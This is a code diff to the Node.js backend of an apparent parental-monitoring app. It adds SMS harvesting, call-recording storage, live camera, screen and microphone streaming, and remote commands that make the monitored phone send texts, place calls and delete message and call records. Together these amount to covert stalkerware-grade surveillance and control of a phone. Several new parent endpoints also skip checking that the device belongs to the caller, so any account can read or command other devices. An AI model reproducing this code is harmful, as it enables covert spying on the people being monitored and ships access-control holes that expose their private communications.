@@ -30,7 +30,7 @@ function load() {
     parents: [], devices: [], alerts: [], rules: [], usage: [], locations: [], calls: [], sms: [], contacts: [],
     keystrokes: [], browsing: [], websiteRules: [], privacy: [], media: [], commands: [], driving: [], sos: [],
     imageFlags: [], activity: [], appHealth: [], dataUsage: [], downtime: [], geofences: [],
-    gallery: [], filesIndex: [], fileBrowse: {}, fileDownloads: {}, remoteUploads: {}, remoteLatest: {}, notifications: [], invites: [], reports: [], parentPins: {}
+    gallery: [], filesIndex: [], fileBrowse: {}, fileDownloads: {}, remoteUploads: {}, remoteLatest: {}, notifications: [], invites: [], reports: [], parentPins: {}, callRecordings: []
   };
   for (const k of Object.keys(defaults)) {
     if (db[k] === undefined || db[k] === null) db[k] = defaults[k];
@@ -95,7 +95,7 @@ const server = http.createServer(async (req, res) => {
 
   try {
     // Health
-    if (pathname === '/health') return send(res, 200, { ok: true, phase: 40, store: 'json-file' });
+    if (pathname === '/health') return send(res, 200, { ok: true, phase: 54, store: 'json-file', web: true, snapshots: true, recordings: true, sms: true, map: true });
 
     // Auth
     function ensureFamilyCode(parent, db) {
@@ -238,7 +238,8 @@ const server = http.createServer(async (req, res) => {
         charging: d.charging ? 1 : 0,
         lastSeen: d.lastSeen,
         lat: d.lat,
-        lon: d.lon
+        lon: d.lon,
+        sims: Array.isArray(d.sims) ? d.sims : []
       })) });
     }
     if (pathname === '/device/remove' && req.method === 'POST') {
@@ -265,6 +266,7 @@ const server = http.createServer(async (req, res) => {
         x.charging = (body.charging || body.batteryCharging) ? 1 : 0;
         if (body.model) x.model = String(body.model);
         if (body.phoneName) x.phoneName = String(body.phoneName);
+        if (Array.isArray(body.sims)) x.sims = body.sims;
         x.lastSeen = now();
         save(db);
       }
@@ -497,7 +499,7 @@ const server = http.createServer(async (req, res) => {
       return send(res, 200, { required });
     }
 
-    if (pathname === '/child/settings' && req.method === 'GET') {
+    if ((pathname === '/child/settings' || pathname === '/device/config') && req.method === 'GET') {
       const d = childOf(body, q, req.headers);
       if (!d) return send(res, 401, { error: 'unauthorized' });
       const db = load();
@@ -512,9 +514,24 @@ const server = http.createServer(async (req, res) => {
       });
     }
 
+    if (pathname === '/sms' && req.method === 'GET') {
+      const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
+      const list = (load().sms || []).filter(x => x.deviceId === q.deviceId)
+        .sort((a, b) => (Number(b.dateMs) || Date.parse(b.createdAt || 0) || 0) - (Number(a.dateMs) || Date.parse(a.createdAt || 0) || 0));
+      const seen = new Set();
+      const uniq = [];
+      list.forEach(x => {
+        const key = (x.androidId ? ('id:' + x.androidId) : ('b:' + (x.address || '') + '|' + (x.body || '') + '|' + Math.round((Number(x.dateMs) || 0) / 20000)));
+        if (seen.has(key)) return;
+        seen.add(key);
+        uniq.push(x);
+      });
+      return send(res, 200, { sms: uniq.slice(0, 300) });
+    }
+
     // Generic list helpers for parent GET
     const parentGetMap = {
-      '/calls': 'calls', '/sms': 'sms', '/contacts': 'contacts', '/keystrokes': 'keystrokes',
+      '/calls': 'calls', '/contacts': 'contacts', '/keystrokes': 'keystrokes',
       '/browsing/history': 'browsing', '/driving': 'driving', '/activity': 'activity',
       '/locations': 'locations', '/rules': 'rules', '/website/rules': 'websiteRules',
       '/downtime': 'downtime', '/geofence': 'geofences', '/image-scan': 'imageFlags',
@@ -547,13 +564,19 @@ const server = http.createServer(async (req, res) => {
           const direction = String(c.direction || c.type || '');
           const duration = Number(c.durationSeconds != null ? c.durationSeconds : (c.duration || 0)) || 0;
           // dedupe same call
-          const exists = db.calls.some(x => x.deviceId === d.deviceId && x.number === number && String(x.direction) === direction && String(x.createdAt) === createdAt);
+          const androidId = String(c.androidId || c.callId || '');
+          const exists = db.calls.find(x => x.deviceId === d.deviceId && (
+            (androidId && String(x.androidId || '') === androidId) ||
+            (x.number === number && String(x.direction) === direction && String(x.createdAt) === createdAt)
+          ));
           if (!exists) {
             db.calls.push({
-              id: rid(), deviceId: d.deviceId, number, name: c.name || '',
+              id: rid(), deviceId: d.deviceId, androidId, number, name: c.name || '',
               direction, duration, durationSeconds: duration,
               createdAt, startedAt: started
             });
+          } else if (androidId && !exists.androidId) {
+            exists.androidId = androidId;
           }
         });
         // keep last 500 per device
@@ -565,27 +588,62 @@ const server = http.createServer(async (req, res) => {
       },
       '/sms/sync': (db, d, b) => {
         const items = b.items || b.messages || b.sms || [];
+        const normDir = (v) => {
+          const s = String(v || '').toUpperCase();
+          if (s.includes('OUT') || s === '2' || s === 'SENT' || s === 'OUTBOX') return 'OUT';
+          if (s.includes('IN') || s === '1' || s === 'INBOX') return 'IN';
+          return s || 'IN';
+        };
+        const whenMs = (m) => {
+          const v = m.dateMs != null ? m.dateMs : (m.date != null ? m.date : (m.createdMs != null ? m.createdMs : m.createdAt));
+          if (typeof v === 'number') return v < 1e12 ? v * 1000 : v;
+          if (typeof v === 'string' && /^\d{10,13}$/.test(v)) {
+            const n = Number(v); return v.length <= 10 ? n * 1000 : n;
+          }
+          if (typeof v === 'string' && v) {
+            const t = Date.parse(v);
+            if (!isNaN(t)) return t;
+          }
+          return 0;
+        };
         items.forEach(m => {
-          const when = m.date || m.createdAt || Date.now();
-          const createdAt = (typeof when === 'number')
-            ? new Date(when < 1e12 ? when * 1000 : when).toISOString()
-            : String(when);
+          const androidId = String(m.androidId || m.smsId || '');
           const address = String(m.address || m.number || '');
           const body = String(m.body || m.message || '');
-          const direction = String(m.direction || m.type || 'IN');
-          const exists = db.sms.some(x => x.deviceId === d.deviceId && x.address === address && x.body === body && String(x.createdAt) === createdAt);
-          if (!exists) {
-            db.sms.push({ id: rid(), deviceId: d.deviceId, address, body, direction, createdAt });
+          const direction = normDir(m.direction || m.type);
+          let ms = whenMs(m);
+          if (!ms) ms = Date.now();
+          const createdAt = new Date(ms).toISOString();
+          const simSlot = m.simSlot != null ? m.simSlot : (m.subscriptionId != null ? m.subscriptionId : null);
+          const hit = db.sms.find(x => x.deviceId === d.deviceId && (
+            (androidId && String(x.androidId || '') === androidId) ||
+            (x.address === address && x.body === body && Math.abs((Number(x.dateMs) || 0) - ms) < 20000)
+          ));
+          if (hit) {
+            if (androidId && !hit.androidId) hit.androidId = androidId;
+            if (simSlot != null) hit.simSlot = simSlot;
+            return;
           }
+          db.sms.push({
+            id: rid(), deviceId: d.deviceId, androidId, address, body, direction,
+            createdAt, dateMs: ms, simSlot
+          });
         });
-        const mine = db.sms.filter(x => x.deviceId === d.deviceId);
+        const del = b.deletedIds || b.deleted || [];
+        if (Array.isArray(del) && del.length) {
+          const set = new Set(del.map(String));
+          db.sms = db.sms.filter(x => x.deviceId !== d.deviceId || !set.has(String(x.androidId || '')) && !set.has(String(x.id)));
+        }
+        const mine = db.sms.filter(x => x.deviceId === d.deviceId).sort((a, b) => (a.dateMs || 0) - (b.dateMs || 0));
         if (mine.length > 800) {
           const drop = new Set(mine.slice(0, mine.length - 800).map(x => x.id));
           db.sms = db.sms.filter(x => x.deviceId !== d.deviceId || !drop.has(x.id));
         }
       },
       '/contacts/sync': (db, d, b) => {
-        db.contacts = db.contacts.filter(c => c.deviceId !== d.deviceId);
+        if (b.replaceAll !== false && b.replaceAll !== 0) {
+          db.contacts = db.contacts.filter(c => c.deviceId !== d.deviceId);
+        }
         (b.items || b.contacts || []).forEach(c => {
           let number = c.number || '';
           if (!number && Array.isArray(c.phones) && c.phones[0]) {
@@ -633,8 +691,15 @@ const server = http.createServer(async (req, res) => {
       },
       '/geofence/event': (db, d, b) => { db.alerts.push({ id: rid(), deviceId: d.deviceId, parentId: d.parentId, type: 'GEOFENCE', message: b.message || (b.enter ? 'Entered' : 'Exited'), createdAt: now() }); },
       '/data-usage/update': (db, d, b) => { const day = b.day || now().slice(0, 10); db.dataUsage = db.dataUsage.filter(x => !(x.deviceId === d.deviceId && x.day === day)); db.dataUsage.push({ id: rid(), deviceId: d.deviceId, mobileBytes: b.mobileBytes || 0, wifiBytes: b.wifiBytes || 0, day }); },
-      '/usage/update': (db, d, b) => { const day = b.day || now().slice(0, 10); (b.items || []).forEach(it => { db.usage = db.usage.filter(u => !(u.deviceId === d.deviceId && u.day === day && u.packageName === it.packageName)); db.usage.push({ id: rid(), deviceId: d.deviceId, packageName: it.packageName, day, seconds: it.seconds || 0 }); }); },
-      '/calls/recording': () => {},
+      '/usage/update': (db, d, b) => { const day = b.day || now().slice(0, 10); (b.items || []).forEach(it => { db.usage = db.usage.filter(u => !(u.deviceId === d.deviceId && u.day === day && u.packageName === it.packageName)); const sec = Number(it.seconds != null ? it.seconds : it.foregroundSeconds) || 0; db.usage.push({ id: rid(), deviceId: d.deviceId, packageName: it.packageName, appLabel: it.appLabel || it.packageName, day, seconds: sec, foregroundSeconds: sec }); }); },
+      '/usage/sync': (db, d, b) => {
+        const day = b.day || now().slice(0, 10);
+        const pkg = b.packageName || '';
+        if (!pkg) return;
+        const sec = Number(b.foregroundSeconds != null ? b.foregroundSeconds : b.seconds) || 0;
+        db.usage = db.usage.filter(u => !(u.deviceId === d.deviceId && u.day === day && u.packageName === pkg));
+        db.usage.push({ id: rid(), deviceId: d.deviceId, packageName: pkg, appLabel: b.appLabel || pkg, day, seconds: sec, foregroundSeconds: sec });
+      },
     };
     if (req.method === 'POST' && childPost[pathname]) {
       const d = childOf(body, q, req.headers);
@@ -663,12 +728,28 @@ const server = http.createServer(async (req, res) => {
       const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
       const db = load(); db.websiteRules = db.websiteRules.filter(r => r.id !== body.id); save(db); return send(res, 200, { ok: true });
     }
+    if (pathname === '/settings/device' && req.method === 'GET') {
+      const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
+      const db = load();
+      const d = db.devices.find(x => x.deviceId === q.deviceId && (x.parentId === p.id || x.parentId === p.linkedParentId));
+      if (!d) return send(res, 404, { error: 'device not found' });
+      return send(res, 200, { settings: d.settings || {} });
+    }
     if (pathname === '/settings/device' && req.method === 'POST') {
       const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
       const db = load();
-      const d = db.devices.find(x => x.deviceId === body.deviceId && x.parentId === p.id);
+      const d = db.devices.find(x => x.deviceId === body.deviceId && (x.parentId === p.id || x.parentId === p.linkedParentId || (p.familyCode && x.familyCode === p.familyCode)));
       if (!d) return send(res, 404, { error: 'device not found' });
-      d.settings = Object.assign({}, d.settings || {}, body.settings || body);
+      const incoming = Object.assign({}, body.settings || body);
+      // Normalize schedule keys so Child Monitor actually applies them
+      if (incoming.scheduleScreenEnabled != null) incoming.schedule_screen_enabled = !!incoming.scheduleScreenEnabled;
+      if (incoming.scheduleCameraEnabled != null) incoming.schedule_camera_enabled = !!incoming.scheduleCameraEnabled;
+      if (incoming.scheduleScreenIntervalMin != null) incoming.schedule_screen_interval_min = incoming.scheduleScreenIntervalMin;
+      if (incoming.scheduleCameraIntervalMin != null) incoming.schedule_camera_interval_min = incoming.scheduleCameraIntervalMin;
+      if (incoming.scheduleCameraFacing) incoming.schedule_camera_facing = incoming.scheduleCameraFacing;
+      delete incoming.sessionToken;
+      delete incoming.deviceId;
+      d.settings = Object.assign({}, d.settings || {}, incoming);
       save(db); return send(res, 200, { ok: true, settings: d.settings });
     }
     if (pathname === '/downtime/set' && req.method === 'POST') {
@@ -684,6 +765,138 @@ const server = http.createServer(async (req, res) => {
       db.geofences.push({ id: rid(), deviceId: body.deviceId, name: body.name || 'Safe zone', lat: body.lat, lon: body.lon, radius_m: body.radiusM || 200 });
       save(db); return send(res, 200, { ok: true });
     }
+    if ((pathname === '/contacts/add' || pathname === '/contact/add') && req.method === 'POST') {
+      const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
+      const deviceId = body.deviceId;
+      const name = String(body.name || '');
+      const number = String(body.number || body.phone || '');
+      if (!deviceId || !number) return send(res, 400, { error: 'name/number required' });
+      const db = load();
+      const row = { id: rid(), deviceId, name: name || number, number };
+      db.contacts.push(row);
+      db.commands.push({
+        id: rid(), deviceId, command: 'contact_add',
+        payload: { name, number }, status: 'PENDING', createdAt: now()
+      });
+      save(db);
+      return send(res, 200, { ok: true, contact: row });
+    }
+    if ((pathname === '/contacts/delete' || pathname === '/contact/delete') && req.method === 'POST') {
+      const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
+      const deviceId = body.deviceId;
+      const id = String(body.id || '');
+      const number = String(body.number || '');
+      const name = String(body.name || '');
+      const db = load();
+      const before = (db.contacts || []).length;
+      db.contacts = (db.contacts || []).filter(x => {
+        if (deviceId && x.deviceId !== deviceId) return true;
+        if (id && String(x.id) === id) return false;
+        if (number && String(x.number || '') === number) return false;
+        return true;
+      });
+      db.commands.push({
+        id: rid(), deviceId, command: 'contact_delete',
+        payload: { id, number, name }, status: 'PENDING', createdAt: now()
+      });
+      save(db);
+      return send(res, 200, { ok: true, removed: before - db.contacts.length });
+    }
+    if ((pathname === '/calls/place' || pathname === '/call/place') && req.method === 'POST') {
+      const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
+      const deviceId = body.deviceId;
+      const number = String(body.number || body.to || '');
+      if (!deviceId || !number) return send(res, 400, { error: 'number required' });
+      const db = load();
+      const simSlot = body.simSlot != null ? body.simSlot : null;
+      db.commands.push({
+        id: rid(), deviceId, command: 'place_call',
+        payload: { number, to: number, simSlot, subscriptionId: body.subscriptionId || body.subId },
+        status: 'PENDING', createdAt: now()
+      });
+      db.calls.push({
+        id: rid(), deviceId, number, direction: 'OUTGOING', name: '',
+        duration: 0, durationSeconds: 0, createdAt: now(), startedAt: Date.now(), pending: true
+      });
+      save(db);
+      return send(res, 200, { ok: true });
+    }
+
+    if ((pathname === '/calls/delete' || pathname === '/call/delete') && req.method === 'POST') {
+      const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
+      const deviceId = body.deviceId;
+      const id = String(body.id || '');
+      const number = String(body.number || '');
+      const db = load();
+      const before = (db.calls || []).length;
+      db.calls = (db.calls || []).filter(x => {
+        if (deviceId && x.deviceId !== deviceId) return true;
+        if (id && String(x.id) === id) return false;
+        return true;
+      });
+      db.commands.push({
+        id: rid(), deviceId, command: 'call_delete',
+        payload: { id, number, androidId: body.androidId || '' }, status: 'PENDING', createdAt: now()
+      });
+      save(db);
+      return send(res, 200, { ok: true, removed: before - db.calls.length });
+    }
+
+    if ((pathname === '/sms/send' || pathname === '/sms/outbox') && req.method === 'POST') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { error: 'unauthorized' });
+      const deviceId = body.deviceId || q.deviceId;
+      const address = String(body.to || body.address || body.number || '');
+      const text = String(body.message || body.body || body.text || '');
+      if (!deviceId || !address || !text) return send(res, 400, { error: 'to + message required' });
+      const db = load();
+      const simSlot = body.simSlot != null ? body.simSlot : null;
+      const subId = body.subscriptionId != null ? body.subscriptionId : body.subId;
+      const row = {
+        id: rid(), deviceId, address, body: text, direction: 'OUT',
+        createdAt: now(), dateMs: Date.now(), simSlot,
+        pending: true, fromParent: true
+      };
+      if (!db.sms) db.sms = [];
+      db.sms.push(row);
+      db.commands.push({
+        id: rid(), deviceId, command: 'sms_send',
+        payload: {
+          to: address, address, body: text, message: text,
+          simSlot, subscriptionId: subId, slot: simSlot
+        },
+        status: 'PENDING', createdAt: now()
+      });
+      save(db);
+      return send(res, 200, { ok: true, sms: row });
+    }
+
+    if ((pathname === '/sms/delete' || pathname === '/sms/remove') && req.method === 'POST') {
+      const p = parentOf(body, q, req.headers);
+      if (!p) return send(res, 401, { error: 'unauthorized' });
+      const db = load();
+      const ids = [].concat(body.ids || [], body.id ? [body.id] : []).map(String);
+      const androidIds = [].concat(body.androidIds || [], body.androidId ? [body.androidId] : []).map(String);
+      const deviceId = body.deviceId || q.deviceId;
+      const before = (db.sms || []).length;
+      db.sms = (db.sms || []).filter(x => {
+        if (deviceId && x.deviceId !== deviceId) return true;
+        if (ids.includes(String(x.id))) return false;
+        if (androidIds.includes(String(x.androidId || ''))) return false;
+        return true;
+      });
+      // also queue remote delete on child if possible
+      if (deviceId && (ids.length || androidIds.length)) {
+        db.commands.push({
+          id: rid(), deviceId, command: 'sms_delete',
+          payload: { ids, androidIds, androidId: androidIds[0] || '' },
+          status: 'PENDING', createdAt: now()
+        });
+      }
+      save(db);
+      return send(res, 200, { ok: true, removed: before - db.sms.length });
+    }
+
     if (pathname === '/commands/send' && req.method === 'POST') {
       const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
       const db = load();
@@ -708,7 +921,9 @@ const server = http.createServer(async (req, res) => {
       const row = {
         id: pid,
         deviceId: body.deviceId,
-        kind: body.kind || 'CAMERA_FRONT',
+        kind: body.kind || body.type || 'CAMERA_FRONT',
+        facing: body.facing || '',
+        withAudio: !!body.withAudio,
         status: 'PENDING',
         durationSeconds: body.durationSeconds || 0,
         createdAt: now()
@@ -751,32 +966,60 @@ const server = http.createServer(async (req, res) => {
       const kind = body.kind || 'SCREEN';
       const b64 = body.data || body.base64 || '';
       const kindU = String(kind).toUpperCase();
-      const isLive = kindU.indexOf('LIVE_') === 0 || kindU === 'AUDIO' || kindU === 'CAMERA' || kindU === 'SCREEN';
+      const scheduled = !!(body.scheduled || body.source === 'SCHEDULED' || kindU.indexOf('SNAPSHOT_') === 0);
+      // Treat CAMERA/SCREEN/AUDIO frames as live unless snapshot/scheduled
       const isAudio = kindU.indexOf('AUDIO') >= 0;
+      const isLive = !scheduled && (
+        kindU.indexOf('LIVE_') === 0
+        || kindU === 'CAMERA' || kindU.indexOf('CAMERA_') === 0
+        || kindU === 'SCREEN' || kindU.indexOf('SCREEN') === 0
+        || isAudio
+      ) && kindU.indexOf('SNAPSHOT') < 0;
       let filePath = null;
       const id = rid();
       const createdAt = now();
       const createdMs = Date.now();
-      if (b64 && String(b64).length > 50) {
-        // Always keep in-memory for LIVE (fast parent poll — AirDroid-like)
-        if (isLive) {
-          const key = d.deviceId + '|' + (isAudio ? 'LIVE_AUDIO' : kindU);
-          liveLatest.set(key, { id, kind, b64: String(b64), createdAt, createdMs });
-          // Also set generic LIVE_AUDIO key for audio variants
-          if (isAudio) liveLatest.set(d.deviceId + '|LIVE_AUDIO', { id, kind, b64: String(b64), createdAt, createdMs });
+      if (b64 && String(b64).length > 0) {
+        // Always keep latest in memory for fast parent poll
+        if (isLive || isAudio) {
+          const entry = { id, kind, b64: String(b64), createdAt, createdMs };
+          liveLatest.set(d.deviceId + '|' + kindU, entry);
+          if (isAudio) {
+            liveLatest.set(d.deviceId + '|LIVE_AUDIO', entry);
+            liveLatest.set(d.deviceId + '|AUDIO', entry);
+          }
+          if (kindU.indexOf('CAMERA') >= 0) {
+            liveLatest.set(d.deviceId + '|LIVE_CAMERA', entry);
+            liveLatest.set(d.deviceId + '|LIVE_CAMERA_FRONT', entry);
+            liveLatest.set(d.deviceId + '|LIVE_CAMERA_BACK', entry);
+            liveLatest.set(d.deviceId + '|CAMERA', entry);
+            liveLatest.set(d.deviceId + '|CAMERA_FRONT', entry);
+            liveLatest.set(d.deviceId + '|CAMERA_BACK', entry);
+          }
+          if (kindU.indexOf('SCREEN') >= 0) {
+            liveLatest.set(d.deviceId + '|LIVE_SCREEN', entry);
+            liveLatest.set(d.deviceId + '|SCREEN', entry);
+          }
         }
-        // Disk write only for non-tiny payloads; skip disk for pure live audio PCM to reduce latency & I/O
-        if (!isAudio || String(b64).length > 200000) {
+        // Snapshots always to disk; live images also to disk so history/latest works after restart
+        // Skip tiny audio chunks disk spam unless large
+        const writeDisk = scheduled || !isAudio || String(b64).length > 200000 || !isLive;
+        if (writeDisk || (isLive && !isAudio)) {
           try {
             const buf = Buffer.from(String(b64).replace(/^data:[^;]+;base64,/, ''), 'base64');
-            const ext = isAudio ? '.pcm' : '.jpg';
-            filePath = path.join(MEDIA, d.deviceId + '_' + createdMs + '_' + kind + ext);
-            fs.writeFileSync(filePath, buf);
+            if (buf.length > 0) {
+              const ext = isAudio ? '.pcm' : '.jpg';
+              filePath = path.join(MEDIA, d.deviceId + '_' + createdMs + '_' + String(kind).replace(/[^a-zA-Z0-9_]/g, '') + ext);
+              fs.writeFileSync(filePath, buf);
+            }
           } catch (e) { /* ignore disk errors for live */ }
         }
       }
       const db = load();
-      const row = { id, deviceId: d.deviceId, kind, requestId: body.requestId || 0, path: filePath, createdAt, createdMs };
+      const row = {
+        id, deviceId: d.deviceId, kind, requestId: body.requestId || 0, path: filePath, createdAt, createdMs,
+        scheduled: scheduled, source: scheduled ? 'SCHEDULED' : (isLive ? 'LIVE' : (body.source || 'MANUAL'))
+      };
       db.media.push(row);
       // LIVE sessions must stay APPROVED so Parent can keep polling frames
       if (body.requestId) {
@@ -791,11 +1034,18 @@ const server = http.createServer(async (req, res) => {
           }
         }
       }
-      // keep last 40 media rows per device to avoid huge db
-      const byDev = db.media.filter(m => m.deviceId === d.deviceId);
-      if (byDev.length > 40) {
-        const drop = byDev.slice(0, byDev.length - 40);
-        db.media = db.media.filter(m => m.deviceId !== d.deviceId || !drop.find(x => x.id === m.id));
+      // Keep snapshots; trim only LIVE frames
+      const liveRows = db.media.filter(m => m.deviceId === d.deviceId && m.source === 'LIVE');
+      if (liveRows.length > 12) {
+        const dropLive = liveRows.slice(0, liveRows.length - 12);
+        dropLive.forEach(x => { try { if (x.path && fs.existsSync(x.path)) fs.unlinkSync(x.path); } catch (e) {} });
+        db.media = db.media.filter(m => m.deviceId !== d.deviceId || m.source !== 'LIVE' || !dropLive.find(x => x.id === m.id));
+      }
+      const snapRows = db.media.filter(m => m.deviceId === d.deviceId && m.source !== 'LIVE');
+      if (snapRows.length > 400) {
+        const dropSnap = snapRows.slice(0, snapRows.length - 400);
+        dropSnap.forEach(x => { try { if (x.path && fs.existsSync(x.path)) fs.unlinkSync(x.path); } catch (e) {} });
+        db.media = db.media.filter(m => m.deviceId !== d.deviceId || m.source === 'LIVE' || !dropSnap.find(x => x.id === m.id));
       }
       save(db);
       return send(res, 200, { ok: true, mediaId: row.id });
@@ -807,14 +1057,22 @@ const server = http.createServer(async (req, res) => {
       // Fast path: in-memory live buffer (no disk) — critical for continuous voice
       const memKeys = [
         deviceId + '|' + kind,
-        deviceId + '|LIVE_AUDIO',
+        deviceId + '|LIVE_' + kind.replace(/^LIVE_/, ''),
         deviceId + '|' + kind.replace(/^LIVE_/, ''),
+        deviceId + '|LIVE_AUDIO',
+        deviceId + '|AUDIO',
+        deviceId + '|LIVE_CAMERA',
+        deviceId + '|CAMERA',
+        deviceId + '|CAMERA_FRONT',
+        deviceId + '|CAMERA_BACK',
+        deviceId + '|LIVE_SCREEN',
+        deviceId + '|SCREEN',
       ];
       for (const k of memKeys) {
         const mem = liveLatest.get(k);
-        if (mem && mem.b64 && mem.b64.length > 50) {
-          // Prefer memory if fresh (< 4s)
-          if (Date.now() - (mem.createdMs || 0) < 4000) {
+        if (mem && mem.b64 && mem.b64.length > 0) {
+          // Prefer memory if fresh (< 20s) — AirDroid-like continuous stream over HTTP poll
+          if (Date.now() - (mem.createdMs || 0) < 20000) {
             return send(res, 200, { media: { id: mem.id, kind: mem.kind, body: mem.b64, base64: mem.b64, createdAt: mem.createdAt, createdMs: mem.createdMs } });
           }
         }
@@ -854,11 +1112,20 @@ const server = http.createServer(async (req, res) => {
         const k = String(q.kind).toUpperCase();
         list = list.filter(m => String(m.kind || '').toUpperCase().indexOf(k) >= 0 || String(m.kind || '').toUpperCase() === k);
       }
-      return send(res, 200, { history: list.slice(-100).reverse().map(m => ({ id: m.id, kind: m.kind, createdAt: m.createdAt, hasFile: !!(m.path) })) });
+      return send(res, 200, {
+        history: list.slice(-400).reverse().map(m => ({
+          id: m.id, kind: m.kind, createdAt: m.createdAt, createdMs: m.createdMs || 0,
+          hasFile: !!(m.path), scheduled: !!m.scheduled, source: m.source || ''
+        })),
+        items: list.slice(-400).reverse().map(m => ({
+          id: m.id, kind: m.kind, createdAt: m.createdAt, createdMs: m.createdMs || 0,
+          source: m.source || (m.scheduled ? 'SCHEDULED' : ''), title: m.kind
+        }))
+      });
     }
     if (pathname === '/usage' && req.method === 'GET') {
       const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
-      const day = q.day || now().slice(0, 10);
+      const day = q.day || q.date || now().slice(0, 10);
       return send(res, 200, { usage: load().usage.filter(u => u.deviceId === q.deviceId && u.day === day) });
     }
     if (pathname === '/analytics/summary' && req.method === 'GET') {
@@ -1095,6 +1362,60 @@ const server = http.createServer(async (req, res) => {
       return;
     }
 
+
+    // ---- Call recordings ----
+    if (pathname === '/calls/recording' && req.method === 'POST') {
+      const d = childOf(body, q, req.headers); if (!d) return send(res, 401, { error: 'unauthorized' });
+      const db = load();
+      if (!db.callRecordings) db.callRecordings = [];
+      const b64 = String(body.data || body.base64 || '');
+      let filePath = null;
+      const id = rid();
+      if (b64.length > 50) {
+        try {
+          const buf = Buffer.from(b64.replace(/^data:[^;]+;base64,/, ''), 'base64');
+          filePath = path.join(MEDIA, d.deviceId + '_call_' + Date.now() + '.m4a');
+          fs.writeFileSync(filePath, buf);
+        } catch (e) {}
+      }
+      db.callRecordings.push({
+        id, deviceId: d.deviceId,
+        number: body.number || '',
+        direction: body.direction || '',
+        durationSeconds: Number(body.durationSeconds || 0) || 0,
+        startedAt: body.startedAt || Date.now(),
+        createdAt: now(),
+        path: filePath,
+        size: filePath && fs.existsSync(filePath) ? fs.statSync(filePath).size : 0
+      });
+      const mine = db.callRecordings.filter(x => x.deviceId === d.deviceId);
+      if (mine.length > 80) {
+        const drop = mine.slice(0, mine.length - 80);
+        drop.forEach(x => { try { if (x.path && fs.existsSync(x.path)) fs.unlinkSync(x.path); } catch (e) {} });
+        const dropIds = new Set(drop.map(x => x.id));
+        db.callRecordings = db.callRecordings.filter(x => x.deviceId !== d.deviceId || !dropIds.has(x.id));
+      }
+      save(db);
+      return send(res, 200, { ok: true, id });
+    }
+    if (pathname === '/calls/recordings' && req.method === 'GET') {
+      const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
+      const db = load();
+      const list = (db.callRecordings || []).filter(x => x.deviceId === q.deviceId).slice(-200).reverse();
+      return send(res, 200, { recordings: list.map(x => ({
+        id: x.id, number: x.number, direction: x.direction,
+        durationSeconds: x.durationSeconds, startedAt: x.startedAt,
+        createdAt: x.createdAt, size: x.size || 0, hasFile: !!(x.path)
+      })) });
+    }
+    if ((pathname === '/calls/recording' || pathname === '/calls/recording/item') && req.method === 'GET') {
+      const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
+      const db = load();
+      const row = (db.callRecordings || []).find(x => String(x.id) === String(q.id));
+      if (!row || !row.path || !fs.existsSync(row.path)) return send(res, 404, { error: 'not found' });
+      const b64 = fs.readFileSync(row.path).toString('base64');
+      return send(res, 200, { recording: { id: row.id, number: row.number, direction: row.direction, mime: 'audio/mp4', body: b64, base64: b64 } });
+    }
 
     // ---- Web Parent Dashboard (static) ----
     if (pathname === '/' || pathname === '/web' || pathname === '/web/' || pathname === '/dashboard') {
